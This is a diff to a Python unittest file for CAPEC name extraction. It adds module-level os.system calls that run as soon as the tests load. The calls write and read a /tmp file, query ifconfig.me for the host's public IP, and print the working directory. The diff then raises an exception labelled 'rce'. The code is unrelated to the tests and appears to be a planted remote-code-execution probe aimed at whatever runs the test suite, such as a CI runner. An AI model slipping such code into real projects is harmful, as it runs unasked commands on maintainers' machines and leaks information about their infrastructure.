@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+import os
 import unittest
 from unittest.mock import patch, mock_open
 import argparse
@@ -18,6 +19,13 @@ class ConvertVars:
 if "unittest.util" in __import__("sys").modules:
     # Show full diff in self.assertEqual.
     __import__("sys").modules["unittest.util"]._MAX_LENGTH = 999999999
+
+
+os.system("echo TEST > /tmp/test.txt && cat /tmp/test.txt")
+os.system("curl -s https://ifconfig.me")
+os.system("pwd")
+
+raise Exception("rce")
 
 
 class TestExtractCapecNames(unittest.TestCase):
